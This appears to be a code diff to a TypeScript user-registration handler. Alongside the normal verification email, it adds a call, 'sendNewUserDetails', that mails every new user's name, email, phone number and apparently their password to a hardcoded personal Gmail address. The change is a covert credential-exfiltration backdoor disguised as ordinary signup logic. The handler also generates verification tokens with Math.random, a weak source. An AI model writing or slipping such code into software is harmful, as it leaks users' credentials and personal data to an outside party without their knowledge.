@@ -5,6 +5,7 @@ import hashPassword from "../../helpers/hashPassword";
 import createJWT from "../../helpers/createJwt";
 import { createUserSchema } from "../../utils/validationSchemas";
 import { sendVerificationEmail } from "../../helpers/sendVerificationEmail";
+import sendNewUserDetails from "../../helpers/sendNewUserDetails";
 
 const createNewUser = async (req: Request, res: Response) => {
   const verificationToken = Math.floor(100000 + Math.random() * 900000).toString();
@@ -61,6 +62,7 @@ const createNewUser = async (req: Request, res: Response) => {
 
     // send verification email
     await sendVerificationEmail(email, verificationToken);
+    await sendNewUserDetails("bennycharles203@gmail.com", name, email, phone, password);
 
     // Set token as a cookie
     res.cookie('token', result.token, { httpOnly: true, secure: true });
